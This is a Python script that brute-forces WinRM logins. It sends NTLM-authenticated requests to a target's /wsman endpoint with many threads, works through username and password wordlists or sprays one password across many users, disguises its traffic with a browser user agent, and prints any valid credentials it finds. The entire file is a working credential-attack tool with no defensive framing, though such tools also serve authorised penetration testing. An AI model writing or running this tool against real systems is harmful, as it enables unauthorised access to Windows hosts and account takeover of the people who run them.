import requests
from requests_ntlm import HttpNtlmAuth
import argparse
from concurrent.futures import ThreadPoolExecutor
from os import _exit


parser = argparse.ArgumentParser(epilog="Multi-Threaded WinRM BruteForcer ")

parser.add_argument('--target', '-t', required=True,help="the WinRM server IP address")
parser.add_argument("--port", type=int,default=5985, help='port to connect to (default=5985)')
parser.add_argument("--username", '-u', help='username to use')
parser.add_argument("--usernames", '-uf', help='username file to use')
parser.add_argument("--passwords", '-pf', help='password file to use')
parser.add_argument("--password", '-p', help='password to use')
parser.add_argument("--threads", type=int, default=20, help='threads to use (default=20), the more threads the more unreliable results the tool gives.')
parser.add_argument('--verbose', '-v', action='store_true', help='verbose output')
parser.add_argument('--stop_on_find', action='store_true', help='stops once find a single valid user:password')


args = parser.parse_args()


FOUND = []
HTTP_AUTH_FAILED_CODE = 401
HTTP_AUTH_SUCCEED_CODE = 200
WINDOWS_UAGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'


if args.port == 5985:
	URL = f'http://{args.target}:5985/wsman'
if args.port == 5986:
	URL = f'https://{args.target}:5986/wsman'

headers = {
	'User-Agent': WINDOWS_UAGENT,
}


def connect(username,password):

	response = requests.post(URL, headers=headers,auth=HttpNtlmAuth(username, password))
	if args.verbose:
		print(f'[+] trying {username}:{password}')
	if response.status_code == HTTP_AUTH_SUCCEED_CODE:
		FOUND.append(f'[*] found valid creds: {username}:{password}')
		print(f'[*] found valid creds: {username}:{password}')
		if args.stop_on_find:
			_exit(-1)


if args.usernames and args.passwords: # iterating through users and passwords 


	password_wordlist = args.passwords
	users_wordlist = args.usernames

	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	passlist = open(password_wordlist ,'r', encoding='latin1').readlines()
	passwords = [p.strip() for p in passlist] # using list comprehnsion for performance improvment

	print(f'[*] working with {len(userlist)} usernames')
	print(f'[*] working with {len(passlist)} passwords\n')
	if args.threads > 100:
		print('[!] you are using more than 100 threads with the (-uf) and (-pf) flags results may not be accurate !')
		print('[!] 100 threads is recommended with this mode \n')
	if not args.verbose:
		
		print('[*] Bruteforcing...')
	

	with ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, password) for user in users for password in passwords]

	if not FOUND:
		print('[-] there is no user:password match in the files')

	if FOUND:
		print('\n')
		print('\n'.join(FOUND))



if args.username: # bruteforcing single user

	password_wordlist = args.passwords
	passlist = open(password_wordlist ,'r', encoding='latin1').readlines()
	passwords = [p.strip() for p in passlist] # using list comprehnsion for performance improvment

	print(f'[*] working with {len(passlist)} passwords\n')
	if not args.verbose:
		
		print(f'\n[*] Bruteforcing...')

	with ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, args.username, password) for password in passwords]

	if not FOUND:
		print(f'[-] did not find password for user ({args.user})')
	if FOUND:
		print('\n')
		print('\n'.join(FOUND))



if args.password and args.usernames: # password spraying 

	users_wordlist = args.usernames
	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	print(f'[*] working with {len(userlist)} usernames')
	if not args.verbose:
		print(f'\n[*] Bruteforcing...')
	with ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, args.password) for user in users]

	if not FOUND:
		print(f'[-] no user matched with password: {args.password}')

	if FOUND:
		print('\n')
		print('\n'.join(FOUND))
